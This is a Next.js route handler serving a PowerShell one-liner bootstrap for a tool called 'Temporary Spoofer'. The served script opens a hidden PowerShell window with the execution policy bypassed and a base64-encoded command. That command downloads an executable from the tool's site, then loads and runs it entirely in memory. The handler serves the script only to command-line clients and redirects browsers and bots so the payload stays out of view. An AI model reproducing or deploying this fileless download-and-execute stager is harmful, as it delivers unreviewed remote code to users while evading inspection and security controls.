import { NextResponse } from "next/server";

// The actual Load + Invoke runs inside a fresh child powershell (-STA, -NoProfile)
// so Application.ResourceAssembly is virgin on every launch. It would otherwise
// throw "cannot be set more than once" after the user closes the window and
// re-runs the one-liner in the same PS session. Base64 via -EncodedCommand so
// we dodge every quote-escape headache.
const INNER: string =
  "$ErrorActionPreference='Stop'\n" +
  "[Net.ServicePointManager]::SecurityProtocol=[Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12\n" +
  "function Err($m){Add-Type -AssemblyName System.Windows.Forms|Out-Null;[System.Windows.Forms.MessageBox]::Show($m,'Temporary Spoofer')|Out-Null}\n" +
  "try{$b=(New-Object Net.WebClient).DownloadData('https://tempspoofer.com/loader.exe')}catch{Err(\"Connection failed: $($_.Exception.Message)\");exit 1}\n" +
  "if(-not $b -or $b.Length -lt 100000){Err('Invalid payload');exit 1}\n" +
  "try{\n" +
  "  Add-Type -AssemblyName PresentationFramework -ErrorAction Stop|Out-Null\n" +
  "  $asm=[Reflection.Assembly]::Load($b)\n" +
  "  if(-not [System.Windows.Application]::ResourceAssembly){[System.Windows.Application]::ResourceAssembly=$asm}\n" +
  "  $e=$asm.EntryPoint\n" +
  "  if($e.GetParameters().Length -eq 0){$e.Invoke($null,@())|Out-Null}else{$e.Invoke($null,(,[string[]]@()))|Out-Null}\n" +
  "}catch{\n" +
  "  $m=$_.Exception.Message\n" +
  "  if($_.Exception.InnerException){$m=$m+[Environment]::NewLine+$_.Exception.InnerException.Message}\n" +
  "  Err(\"Startup error: $m\")\n" +
  "  exit 1\n" +
  "}finally{$b=$null;[GC]::Collect()}";

function buildScript(inner: string): string {
  // -EncodedCommand expects UTF-16LE base64.
  const utf16 = Buffer.from(inner, "utf16le").toString("base64");
  // Outer script: just show a short status in the user's current session,
  // then spawn the real work in a hidden child so the WPF AppDomain is clean.
  return [
    "& {",
    "$ErrorActionPreference = 'Stop'",
    "$ProgressPreference    = 'SilentlyContinue'",
    "",
    "Write-Host ''",
    "Write-Host '  Temporary Spoofer' -ForegroundColor White",
    "Write-Host '  -----------------' -ForegroundColor DarkGray",
    "Write-Host '  preparing...' -ForegroundColor DarkGray",
    "",
    "try {",
    "    Start-Process -FilePath 'powershell.exe' -ArgumentList @(",
    "        '-NoProfile','-ExecutionPolicy','Bypass','-STA','-WindowStyle','Hidden',",
    `        '-EncodedCommand','${utf16}'`,
    "    ) | Out-Null",
    "    Write-Host '  starting...' -ForegroundColor Green",
    "} catch {",
    `    Write-Host "  launch failed: $($_.Exception.Message)" -ForegroundColor Red`,
    "}",
    "}",
    "",
  ].join("\n");
}

const SCRIPT = buildScript(INNER);

// PowerShell's Invoke-RestMethod / curl / wget are the only clients we want
// to serve the bootstrap text to. Anything else (Chrome, Safari, Firefox,
// bots, scrapers) gets bounced home so the script never sits visible in an
// address bar.
function isAutomationUA(ua: string): boolean {
  const u = ua.toLowerCase();
  return u.includes("powershell") || u.startsWith("curl/") || u.startsWith("wget/")
      || u.includes("winhttp") || u.includes("microsoft-cryptoapi");
}

export async function GET(req: Request) {
  const ua = req.headers.get("user-agent") ?? "";
  if (!isAutomationUA(ua)) {
    return NextResponse.redirect(new URL("/", req.url), 302);
  }
  return new NextResponse(SCRIPT, {
    status: 200,
    headers: {
      "content-type": "text/plain; charset=utf-8",
      "cache-control": "no-store",
      "x-robots-tag": "noindex, nofollow",
    },
  });
}
